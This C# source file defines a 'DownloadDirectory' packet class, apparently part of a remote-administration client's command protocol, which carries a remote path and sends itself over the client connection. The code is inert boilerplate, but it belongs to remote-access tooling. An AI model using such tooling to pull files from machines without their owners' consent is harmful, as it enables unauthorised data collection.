using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    class DownloadDirectory : IPacket
    {

        public string RemotePath { get; set; }

        public DownloadDirectory()
        {
        }

        public DownloadDirectory(string remotepath)
        {
            this.RemotePath = remotepath;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
